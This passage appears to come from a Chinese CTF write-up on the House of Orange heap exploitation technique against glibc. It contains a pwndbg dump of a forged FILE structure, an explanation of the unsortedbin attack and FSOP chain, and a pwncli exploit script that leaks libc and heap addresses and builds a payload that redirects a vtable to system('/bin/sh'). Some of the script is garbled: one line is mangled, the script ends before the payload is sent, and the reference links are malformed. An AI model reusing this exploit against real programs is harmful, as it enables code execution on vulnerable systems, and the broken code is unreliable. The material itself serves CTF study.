
```pwndbg> p**&_IO_list_all
$2 = {
  file = {
    _flags = -1391456240,
    _IO_read_ptr = 0x5632ad0df8e0 "/bin/sh",
    _IO_read_end = 0x5632ad0df8e0 "/bin/sh",
    _IO_read_base = 0x7fd15b716510 "",
    _IO_write_base = 0x7fd15b715b88  "\340\370\r\255\062V",
    _IO_write_ptr = 0x7fd15b715b88  "\340\370\r\255\062V",
    _IO_write_end = 0x7fd15b715b98  "\210[q[\321\177",
    _IO_buf_base = 0x7fd15b715b98  "\210[q[\321\177",
    _IO_buf_end = 0x7fd15b715ba8  "\230[q[\321\177",
    _IO_save_base = 0x7fd15b715ba8  "\230[q[\321\177",
    _IO_backup_base = 0x7fd15b715bb8  "\250[q[\321\177",
    _IO_save_end = 0x7fd15b715bb8  "\250[q[\321\177",
    _markers = 0x5632ad0df8e0,
    _chain = 0x5632ad0df8e0,                        # 划重点！！！
    _fileno = 1534155736,
    _flags2 = 32721,
    _old_offset = 140537159048152,
    _cur_column = 23528,
    _vtable_offset = 113 'q',
    _shortbuf = "[",
    _lock = 0x7fd15b715be8 ,
    _offset = 140537159048184,
    _codecvt = 0x7fd15b715bf8 ,
    _wide_data = 0x7fd15b715c08 ,
    _freeres_list = 0x7fd15b715c08 ,
    _freeres_buf = 0x7fd15b715c18 ,
    __pad5 = 140537159048216,
    _mode = 1534155816,
    _unused2 = "\321\177\000\000(\\q[\321\177\000\000\070\\q[\321\177\000"
  },
  vtable = 0x7fd15b715c38 
}
```

要执行`vtable`的overflow，需要满足的条件之一就是`mode`，arena中的这个位置有时候是负数有时候是正数。

如何去寻找下一个`FILE`结构呢，通过`_chain`字段，这是个链表通过`_chain`连接，该字段刚好位于smallbin 0x60的位置，所以需要在这里填上一个我们伪造的`_IO_FILE_plus`结构，那就是刚刚把unsortedbin chunk的`size`修改成0x61的原因。

再来回顾一下Unsortedbin Attack的过程：

- 首先是遍历unsortedbin chunk，首先第一个是没啥问题的，正常断链装入smallbin
- 遍历到第二个chunk的时候，由于第一个chunk伪造了`fd`和`bk`导致unsortedbin损坏，引起报错执行`malloc_printerr`

该chunk是在这个时候进入smallbin的

4> 完整exp：

```#!/usr/bin/env python3

# Date: 2024-01-10 10:54:52

# Link: https://github.com/RoderickChan/pwncli

# Usage:
#     Debug : python3 exp.py debug elf-file-path -t -b malloc
#     Remote: python3 exp.py remote elf-file-path ip:port

from pwncli import *

cli_script()

io: tube = gift.io

elf: ELF = gift.elf

libc: ELF = gift.libc

one_gadgets: list = get_current_one_gadget_from_libc(more=False)

# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(i, prompt='Your choice :'):

    sla(prompt, i)

def add(nb,name,nb2,color):

    cmd('1')

    sla('Length of name :',str(nb))

    sa('Name',name)

    sla('Price of Orange:',str(nb2))

    sla('Color of Orange:',str(color))

    #......

def show():

    cmd('2')

    ru('Name of house : ')

    return rl()[:-1]

    #......

def edit(nb,name,nb2,color):

    cmd('3')

    sla('Length of name :',str(nb))

    sa('Name',name)

    sla('Price of Orange:',str(nb2))

    sla('Color of Orange:',str(color))

def dele():

    cmd('4')

    #......

# i need a unsortedbin chunk
# i need libc leak
# 没有free，没法轻易释放chunk
# 但是有溢出，可以释放top chunk，拿到一个unsortedbin chunk
# 然后呢？伪造count所在chunk的hdr，导致合并，使用show触发UAR漏洞拿到libc leak的同时拿到 unsortedbin chunk！
# edit top size  top size
# trigger top grow

add(0x1000,'a',123,1)

add(0x500,'b'*8,123,4)

leak = show()[8:]

leak = unpack(leak,'all')

io_list_all = leak + 0x3b8

libc.address = leak-0x3c5168

success(f"leak => {hex(leak)}")

success(f"_IO_list_all => {hex(io_list_all)}")

# leak heap address 

edit(0x500,'s'*16,123,2)

leak_heap = show()[16:]

leak_heap = unpack(leak_heap,'all')

heap_address = (leak_heap >> 12)  {hex(leak_heap)}")

success(f"heap base => {hex(heap_address)}")

success(f"libc base => {hex(libc.address)}")

# prepare a fake _IO_list_all 

target = libc.sym.system    # 【疑问】参数为什么是 chunk addr ？

payload = flat({

    0x508:pack(0x21),

    0x520:b'/bin/sh\x00',

    0x528:pack(0x61),

    0x530:pack(0) + pack(io_list_all-0x10),

    0x540:pack(2) + pack(3),

    0x5e0:pack(0),

    0x520+0xd8:pack(heap_address + 0x9b8),

    0x520+0xd8+0x18:pack(target)

},filler='\x00')    # file.mode 
```

3> 参考资料：

- [0] [//roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#2-house-of%E7%B3%BB%E5%88%97" target="_blank" rel="noopener noreferrer nofollow"](https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#2-house-of%E7%B3%BB%E5%88%97:rel="nofollow noopener" href="https)

- [1] [//www.anquanke.com/post/id/218887" target="_blank" rel="noopener noreferrer nofollow"](https://www.anquanke.com/post/id/218887:rel="nofollow noopener" href="https)

- [2] [//0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#unsortedbin-attack" target="_blank" rel="noopener noreferrer nofollow"](https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#unsortedbin-attack:rel="nofollow noopener" href="https)

- [3] [//github.com/shellphish/how2heap/blob/master/glibc_2.23/unsorted_bin_attack.c" target="_blank" rel="noopener noreferrer nofollow"](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/unsorted_bin_attack.c:rel="nofollow noopener" href="https)

- [4] [//evilpan.com/2022/07/30/glibc-exp-tricks/" target="_blank" rel="noopener noreferrer nofollow"](https://evilpan.com/2022/07/30/glibc-exp-tricks/:rel="nofollow noopener" href="https)

- [5] [//ctf-wiki.org/pwn/linux/user-mode/io-file/fsop/" target="_blank" rel="noopener noreferrer nofollow"](https://ctf-wiki.org/pwn/linux/user-mode/io-file/fsop/:rel="nofollow noopener" href="https)
